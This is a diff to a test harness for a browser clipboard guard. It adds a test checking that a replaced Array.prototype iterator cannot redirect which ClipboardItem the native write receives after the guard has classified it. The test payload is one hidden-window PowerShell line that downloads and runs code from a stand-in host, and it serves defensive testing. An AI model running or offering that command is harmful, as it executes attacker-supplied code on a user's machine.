@@ -23,6 +23,9 @@ import vm from "node:vm";
 // guard reads shadowed own properties or the captured native accessor.
 const BOOTSTRAP = `
   globalThis.__probe = { writeText: [], write: [], setData: [], execCommand: [] };
+  // The sandbox realm's own intrinsics, so a test can tamper with the same
+  // Array.prototype the guard and the stubs actually use.
+  globalThis.__realm = { Array };
 
   globalThis.Blob = function Blob(text) { this.__text = String(text); };
   Blob.prototype.text = function () { return Promise.resolve(this.__text); };
@@ -43,7 +46,11 @@ const BOOTSTRAP = `
     return Promise.resolve();
   };
   Clipboard.prototype.write = function (items) {
-    __probe.write.push(items);
+    // Emulate WebIDL sequence<ClipboardItem> conversion: iterate via @@iterator,
+    // so a redirected iterator would change what this "native" actually sees.
+    const out = [];
+    for (const item of items) out.push(item);
+    __probe.write.push(out);
     return Promise.resolve();
   };
 
@@ -396,6 +403,40 @@ const check = (name, condition, detail = "") => {
       `forwarded ${probe.write.length - before} call(s)`);
     check("a re-iterating iterable cannot swap in a payload after classification",
       forwarded && forwarded[0] === benign, "native received a different item than was classified");
+  }
+
+  // A replaced Array.prototype[Symbol.iterator] must not redirect the native's
+  // view of the snapshot. Without the own iterator on the snapshot this fails:
+  // the guard classifies the first yield and the native iterates the second.
+  {
+    const before = probe.write.length;
+    const benign = new ctx.ClipboardItem({ "text/plain": "harmless text" });
+    const payload = new ctx.ClipboardItem({
+      "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+    });
+    let pass = 0;
+    const realm = ctx.__realm.Array;
+    const realIter = realm.prototype[Symbol.iterator];
+    realm.prototype[Symbol.iterator] = function () {
+      const which = pass++ === 0 ? [benign] : [payload];
+      let i = 0;
+      return { next: () => (i < which.length
+        ? { value: which[i++], done: false }
+        : { value: undefined, done: true }) };
+    };
+    try {
+      click();
+      // Build the input INSIDE the sandbox realm: an array literal here would
+      // carry Node's Array.prototype, so tampering the sandbox's prototype
+      // would not apply to it and this test would pass vacuously.
+      await clipboard.write(realm.of(benign));
+    } finally {
+      realm.prototype[Symbol.iterator] = realIter;
+    }
+    const forwarded = probe.write[probe.write.length - 1];
+    check("a replaced Array.prototype iterator cannot redirect the native's view",
+      probe.write.length === before + 1 && forwarded?.length === 1 && forwarded[0] === benign,
+      "native iterated an item the classifier never inspected");
   }
 
   // A legitimate non-text item must still go through.
